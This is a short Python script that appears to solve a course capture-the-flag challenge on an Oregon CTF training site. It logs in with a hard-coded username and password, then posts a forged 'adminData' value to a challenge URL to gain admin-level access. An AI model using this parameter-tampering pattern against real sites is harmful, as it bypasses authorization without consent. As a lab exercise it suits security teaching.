import requests

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

loginResponse = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/challenges/278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin"

postData = {"adminData": "youAreAnAdminOfAwesomenessWoopWoop"}

response2 = session.post(targetUrl, data=postData)

print(response2.text)
